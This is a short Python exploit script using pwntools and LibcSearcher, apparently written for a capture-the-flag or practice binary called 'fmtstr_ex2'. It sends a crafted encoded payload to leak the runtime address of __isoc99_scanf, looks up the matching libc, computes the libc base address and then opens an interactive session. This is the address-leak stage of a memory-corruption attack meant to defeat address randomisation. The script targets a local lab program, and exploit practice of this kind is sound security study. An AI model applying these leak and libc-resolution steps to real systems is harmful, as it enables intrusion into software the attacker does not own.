from pwn import *
from LibcSearcher3 import *

io = process('./fmtstr_ex2')
context.log_level = 'debug'
raw_input()

payload = b'\x49\x8c\xcc\x09\x1c' # __isoc99_scanf+178
 
io.sendafter(b'choice:',b'2\n')
io.sendafter(b'encode:',payload)
io.recvuntil(b'after encoding...\n')
scanf_addr = io.recv()[:14]
scanf_addr = int(scanf_addr,16) 
scanf_addr -= 178

libc = LibcSearcher('__isoc99_scanf',scanf_addr)
libcbase = scanf_addr - libc.dump('__isoc99_scanf')

io.interactive()
